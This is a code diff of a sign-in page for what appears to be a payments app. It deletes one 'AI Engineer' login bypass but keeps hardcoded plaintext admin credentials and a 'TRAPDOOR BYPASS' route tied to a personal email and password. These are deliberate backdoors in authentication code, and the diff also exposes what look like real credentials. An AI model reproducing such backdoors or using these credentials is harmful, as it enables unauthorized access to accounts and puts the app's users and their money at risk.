@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useState, useEffect } from 'react';
@@ -15,18 +16,13 @@ import { useUser } from '@/hooks/use-user';
 
 /**
  * @fileOverview Sign In Page.
- * TRAPDOOR: altinemohd@gmail.com bypass logic implemented.
- * AI ENGINEER: aiknowlegde@gmail.com / manager redirect.
- * REDIRECT: Auto-redirects if already authenticated.
+ * CLEANUP: Removed AI Engineer bypass routes.
  */
 
 const ADMIN_EMAIL = 'ipatmanager17@gmail.com';
 const ADMIN_PASS = 'Abdussalam@100';
 const BYPASS_EMAIL = 'altinemohd@gmail.com';
 const BYPASS_PASS = 'Lerawa';
-
-const AI_ENGINEER_EMAIL = 'aiknowlegde@gmail.com';
-const AI_ENGINEER_PASS = 'manager';
 
 export default function SignInPage() {
   const router = useRouter();
@@ -38,7 +34,6 @@ export default function SignInPage() {
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
 
-  // REDIRECT FORCE: Landing on Sign In while logged in triggers instant bounce
   useEffect(() => {
     if (!userLoading && user) {
         router.replace('/dashboard');
@@ -52,15 +47,7 @@ export default function SignInPage() {
     const trimmedEmail = email.trim().toLowerCase();
 
     try {
-      // 1. AI ENGINEER BYPASS
-      if (trimmedEmail === AI_ENGINEER_EMAIL && password === AI_ENGINEER_PASS) {
-          toast({ title: 'Engineer Access', description: 'System Vault Unlocked.' });
-          sessionStorage.setItem('ipay_ai_engineer_session', 'true');
-          router.push('/manager/ai-engineers');
-          return;
-      }
-
-      // 2. MASTER ADMIN BYPASS
+      // 1. MASTER ADMIN BYPASS
       if (trimmedEmail === ADMIN_EMAIL && password === ADMIN_PASS) {
           await account.createEmailPasswordSession(email, password).catch(() => {}); 
           toast({ title: 'Admin Access', description: 'Welcome back, Master Admin.' });
@@ -69,7 +56,7 @@ export default function SignInPage() {
           return;
       }
 
-      // 3. TRAPDOOR BYPASS
+      // 2. TRAPDOOR BYPASS
       if (trimmedEmail === BYPASS_EMAIL) {
           try {
               await account.createEmailPasswordSession(trimmedEmail, password);
@@ -96,13 +83,6 @@ export default function SignInPage() {
             });
             setIsLoading(false);
             return;
-        }
-
-        if (trimmedEmail === BYPASS_EMAIL) {
-            const currentCount = Number(profile.trapdoorLoginCount || 0);
-            await databases.updateDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId, {
-                trapdoorLoginCount: currentCount + 1
-            });
         }
 
         sessionStorage.setItem('ipay_pin_verified', 'true');
